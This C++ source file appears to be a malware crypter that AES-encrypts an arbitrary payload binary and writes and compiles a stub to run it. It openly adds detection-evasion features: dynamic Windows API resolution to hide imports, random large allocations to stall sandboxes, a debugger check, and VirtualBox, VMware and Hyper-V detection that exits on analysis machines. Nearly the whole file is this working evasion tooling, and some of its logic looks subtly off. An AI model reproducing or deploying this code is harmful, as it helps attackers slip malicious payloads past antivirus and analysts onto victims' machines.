#include <iostream>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <filesystem>
#include <random>
#include <regex>
#include "utils.h"
#include "flags.h"

using namespace std;

const string DYN_GLOBALS = R"(
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
)";

const string DYN_RESOLUTION = R"(
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    
    if (!kernel32) {
        cerr << "Failed to load kernel32.dll with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Successfully loaded kernel32.dll at address: " << kernel32 << "\n";
    }

    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualFree_t pVirtualFree = NULL;
    LoadLibraryA_t pLoadLibraryA = NULL;
    GetProcAddress_t pGetProcAddress = NULL;
    CreateThread_t pCreateThread = NULL;
    WaitForSingleObject_t pWaitForSingleObject = NULL;
    CloseHandle_t pCloseHandle = NULL;
    /**/

    // Resolve each function explicitly
    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
    if (!pVirtualAlloc) {
        cerr << "Failed to resolve VirtualAlloc with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualAlloc at address: " << (void*)pVirtualAlloc << "\n";
    }

    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
    if (!pVirtualFree) {
        cerr << "Failed to resolve VirtualFree with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualFree at address: " << (void*)pVirtualFree << "\n";
    }

    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        cerr << "Failed to resolve LoadLibraryA with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pLoadLibraryA at address: " << (void*)pLoadLibraryA << "\n";
    }

    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
    if (!pGetProcAddress) {
        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
    }

    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
    if (!pCreateThread) {
        cerr << "Failed to resolve CreateThread with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCreateThread at address: " << (void*)pCreateThread << "\n";
    }

    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
    if (!pWaitForSingleObject) {
        cerr << "Failed to resolve WaitForSingleObject with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pWaitForSingleObject at address: " << (void*)pWaitForSingleObject << "\n";
    }

    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");
    if (!pCloseHandle) {
        cerr << "Failed to resolve CloseHandle with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCloseHandle at address: " << (void*)pCloseHandle << "\n";
    }
)";

const string RAND_DEF = R"(
int getRand(){
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(100000000, 150000000);

    return distrib(gen);
}
)";

const string RAND_CALL = R"(
    int a = getRand();
    int b = getRand();

    char *blocka = NULL;
    blocka = (char *) malloc(a);

    if(blocka != NULL){
        memset(blocka, 00, a);
        free(blocka);
    }

    char *blockb = NULL;
    blockb = (char *) malloc(b);

    if(blockb != NULL){
        memset(blockb, 00, a);
        free(blockb);
        execute(payload);
    }

)";

const string DB_DEF = R"(
void antiDb(){
    
    if(IsDebuggerPresent()){
        cout << "\nDebugger present\nexiting...";
        cin.get();
        exit(0);
    } else {
        cout << "\nNo debugger attached...\n";
    }
}

)";

// Anti-VM Source Edited From: https://github.com/basedpill/detectvm
const string ANTI_VM_DEF = R"(
bool DetectBySystemManufacturer()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    //System manufacturer
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemManufacturer"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }
    return false;
}
bool DetectByBiosVendor()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("BIOSVendor"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Microsoft Corporation") == 0)
                return true;
        }
    }

    return false;
}

bool DetectBySystemFamily()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemFamily"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool DetectByProductName()
{
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = { 0 }; DWORD dwBufSize = sizeof(buf);

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\HardwareConfig\\Current\\"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
    {
        LSTATUS result = RegGetValue(hKey, NULL, TEXT("SystemProductName"), RRF_RT_REG_SZ, NULL, buf, &dwBufSize);
        if (result == ERROR_SUCCESS)
        {
            if (strcmp(buf, "Virtual Machine") == 0)
                return true;
        }
    }

    return false;
}

bool IsVboxVM(){
    HANDLE handle = CreateFile(_T("\\\\.\\VBoxMiniRdrDN"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle != INVALID_HANDLE_VALUE){CloseHandle(handle); return true;}
    return false;
}

bool IsVMwareVM(){
    HKEY hKey = 0; DWORD dwType = REG_SZ; char buf[255] = {0}; DWORD dwBufSize = sizeof(buf);
    if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_QUERY_VALUE, &hKey ) == ERROR_SUCCESS ) {return true;}
    return false;
}

bool IsMsHyperV() {
    //Use multiple known reg entries to indicate Virtual Machines
    return DetectBySystemManufacturer() || DetectByBiosVendor() || DetectBySystemFamily()|| DetectByProductName();
}
void antiVm(){
    bool isVm = false;
    if (IsVboxVM() == true) {
        isVm = true; 
        printf("Running in vbox!");
    } else if (IsVMwareVM() == true) {
        isVm = true; 
        printf("Running in vmware!");
    } else if (IsMsHyperV() == true) {
        isVm = true; 
        printf("Running in hyper-v!");
    } else { 
        printf("Not running in a VM!");
    }
    
    if(isVm == true){
        printf("\nexiting...\n");
        std::cin.get();
        exit(0);
    }
}
)";

string bytesToHexString(const vector<unsigned char> &bytes) {
    stringstream ss;
    ss << hex << setfill('0');
    for (size_t i = 0; i < bytes.size(); ++i) {
        ss << "0x" << setw(2) << static_cast<int>(bytes[i]);
        if (i < bytes.size() - 1) {
            ss << ", ";
        }
    }
    return ss.str();
}
void printBytesHex(const vector<unsigned char> &bytes, size_t numBytes) {
    for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
    }
    cout << dec << endl; // Switch back to decimal
}

string generateRandomString(size_t length) {
    const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";
    const size_t max_index = (sizeof(charset) - 1);
    string randomString(length, 0);
    random_device rd;
    mt19937 generator(rd());
    uniform_int_distribution<> distribution(0, max_index);

    for (size_t i = 0; i < length; ++i) {
        randomString[i] = charset[distribution(generator)];
    }

    return randomString;
}

// Returns bytes of binary
vector<unsigned char> readBinary(string &path_to_payload) {
    ifstream file(path_to_payload, ios::binary | ios::ate);
    if (!file) {
        cerr << "Could not open binary\n";
        return {};
    }

    streamsize len = file.tellg();
    file.seekg(0, ios::beg);

    vector<char> buf(len);
    if (!file.read(buf.data(), len)) {
        std::cerr << "Error reading binary\n";
        return {};
    }

    file.close();
    
    // Convert from char vector to unsigned char vector 
    vector<unsigned char> payloadBytes(buf.begin(), buf.end());

    return payloadBytes;
}

pair <vector<unsigned char>, vector<unsigned char>> generateKeyAndIV(size_t keySize, size_t ivSize) {
    vector<unsigned char> key(keySize);
    vector<unsigned char> iv(ivSize);
    
    if (!RAND_bytes(key.data(), keySize) || !RAND_bytes(iv.data(), ivSize)) {
        cerr << "error generating key and IV\n";
        exit(1);
    }

    return make_pair(key, iv);

}

vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    
    if (!ctx) {
        cerr << "Encryption CTX error\n";
        exit(1);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "Encryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> ciphertext(buf.size());
    int len;

    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "Encryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}


vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "Decryption CTX error\n";
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "Decryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "decryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}


void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    ifstream file(stubTemplatePath);
    if (!file) {
        cerr << "Could not open stub template\n";
        return;
    }
    
    string name = generateRandomString(8);
    filesystem::create_directories(outputDirPath);
    string outputPath = outputDirPath + "stub_" + name + ".cpp";

    ofstream outputFile(outputPath);
    if (!outputFile) {
        cerr << "Could not create stub output\n";
        return;
    }

    string line;
    while (getline(file, line)) {
        size_t pos;

        // Replace placeholders with actual values
        if ((pos = line.find("/*ENCRYPTED_BYTES*/")) != string::npos) {
            line.replace(pos, strlen("/*ENCRYPTED_BYTES*/"), bytesToHexString(payloadBytes));
        }
        if ((pos = line.find("/*KEY*/")) != string::npos) {
            line.replace(pos, strlen("/*KEY*/"), bytesToHexString(key));
        }
        if ((pos = line.find("/*IV*/")) != string::npos) {
            line.replace(pos, strlen("/*IV*/"), bytesToHexString(iv));
        }

        // Check dynamic API resolution flag first so that anti vm api calls dont get updated in the case that both flags are set 
        if(flags[DYN] == true){
            // Replacing the calls in execute() first before the resolution logic is added, so the LoadLibraryA() call used when loading kernel32.dll is not replaced
            line = regex_replace(line, regex("\\bVirtualAlloc\\b"), "pVirtualAlloc");
            line = regex_replace(line, regex("\\bVirtualFree\\b"), "pVirtualFree");
            line = regex_replace(line, regex("\\bLoadLibraryA\\b"), "pLoadLibraryA");
            line = regex_replace(line, regex("\\bGetProcAddress\\b"), "pGetProcAddress");
            line = regex_replace(line, regex("\\bCreateThread\\b"), "pCreateThread");
            line = regex_replace(line, regex("\\bWaitForSingleObject\\b"), "pWaitForSingleObject");
            line = regex_replace(line, regex("\\bCloseHandle\\b"), "pCloseHandle");
            
            if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
                line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
            }
            if ((pos = line.find("/*DYN_RESOLUTION*/")) != string::npos) {
                line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
            }

            cout << "\nset dynamic api resolution\n";
            flags[DYN] = false;
        }

        if (flags[RAND] == true){
            if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
            }
            // dictionary in resource
            // choose random selection of words and populate large vector to replace /*ENTROPY*/
            if ((pos = line.find("/*ENTROPY*/")) != string::npos) {
                line.replace(pos, strlen("/*ENTROPY*/"), "/*ENTROPY*/");
            }
            if ((pos = line.find("execute(payload);")) != string::npos) {
                line.replace(pos, strlen("execute(payload);"), RAND_CALL);
            }
            
            cout << "\nset randomizaton\n";
            flags[RAND] = false;
        }
        
        if (flags[VM] == true){
            if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
            }
            if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
                line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
            }

            cout << "\nset antiVM\n";
            flags[VM] = false;
        }

        if (flags[DB] == true){
            if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
            }
            if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
                line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
            }

            cout << "\nset antiDB\n";
            flags[DB] = false;
        }

        outputFile << line << endl;
    }

    file.close();
    outputFile.close();

    cout << "\nSuccessfully wrote stub to: " << outputPath << "\n";

    if(flags[COMPILE] == true){
        cout << "\ncompiling stub...\n";
        string tmp = "make out/stub_" + name + ".exe";
        const char *command = tmp.c_str();

        int out = system(command);
        if(out == 0){
            cout << "\ncompilation successful\n";
            cout << "->\t/out/stub_" << name << ".exe\n";
        } else {
            cerr << "\ncompilation failed\n";
        }

    }
}